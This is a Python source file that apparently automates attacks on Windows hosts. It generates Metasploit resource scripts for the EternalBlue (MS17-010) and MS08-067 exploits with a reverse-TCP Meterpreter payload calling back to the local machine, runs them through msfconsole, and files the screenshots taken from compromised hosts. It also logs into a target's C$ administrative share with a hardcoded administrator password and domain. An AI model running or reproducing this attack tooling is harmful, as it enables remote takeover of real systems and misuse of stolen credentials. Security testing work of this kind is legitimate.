import subprocess
import os
import smbclient
import re
import shutil

class poc_module:
    def __init__(self,ipaddress):
        self.ip = ipaddress
    def smb_account_poc(self,username,password,domain):
        try:
            smb = smbclient.SambaClient(server=self.ip, share="C$", username=username, password=password, domain=domain)
            exploit_folder = smb.listdir('/Program Files (x86)')
            return exploit_folder
        except:
            exploit_folder = "NULL"
            return exploit_folder
    def write_config(self,file,ipaddress,module):
        #1 for bridege
        #2 localhost
        #3 vpn
        lhost = subprocess.check_output(["hostname -I | awk '{print $1}'"],shell=True).decode("utf-8")
        if module == "ms17010":
            file.write('use exploit/windows/smb/ms17_010_eternalblue \n')
            file.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
            file.write('set RHOST '+str(ipaddress)+'\n')
            # file.write('set LHOST '+str(subprocess.check_output(["hostname -I | awk '{print $1}'"],shell=True).decode("utf-8"))+'\n') bridege
            file.write('set LHOST '+str(lhost))
            file.write('set AutoRunScript multiscript -rc auto.rc'+'\n')
            file.write('exploit \n')
            file.write('exit -y \n')
        if module == "ms08067":
            file.write('use exploit/windows/smb/ms08_067_netapi \n')
            file.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
            file.write('set RHOST '+str(ipaddress)+'\n')
            # file.write('set LHOST '+str(subprocess.check_output(["hostname -I | awk '{print $1}'"],shell=True).decode("utf-8"))+'\n') bridege
            file.write('set LHOST '+str(lhost))
            file.write('set AutoRunScript multiscript -rc auto.rc'+'\n')
            file.write('exploit \n')
            file.write('exit -y \n')
    def ms17010_poc(self):
        configFile=open('ms17010configure.rc','w')
        self.write_config(configFile,self.ip,"ms17010")
        configFile.close()
        os.system('msfconsole -r ms17010configure.rc')
        try:
            old_pic_name = [e for e in os.listdir('.') if e.endswith("jpeg")][0]
            new_pic_name = str(self.ip).replace('.','_',3)+".jpeg"
            os.rename(old_pic_name,new_pic_name)
            final_path = "data/picture/"+new_pic_name
            shutil.move(new_pic_name, final_path)
            os.remove("ms17010configure.rc")
            return final_path
        except:
            os.remove("ms17010configure.rc")
            return "NULL"
    def ms08067_poc(self):
        configFile=open('ms08067configure.rc','w')
        self.write_config(configFile,self.ip,"ms08067")
        configFile.close()
        os.system('msfconsole -r ms08067configure.rc')
        try:
            old_pic_name = [e for e in os.listdir('.') if e.endswith("jpeg")][0]
            new_pic_name = str(self.ip).replace('.','_',3)+".jpeg"
            os.rename(old_pic_name,new_pic_name)
            final_path = "data/picture/"+new_pic_name
            shutil.move(new_pic_name, final_path)
            os.remove("ms08067configure.rc")
            return final_path
        except:
            os.remove("ms08067configure.rc")
            return "NULL"
print(poc_module("192.168.89.214").smb_account_poc("administrator","1qaz@WSX","alex-ad.local"))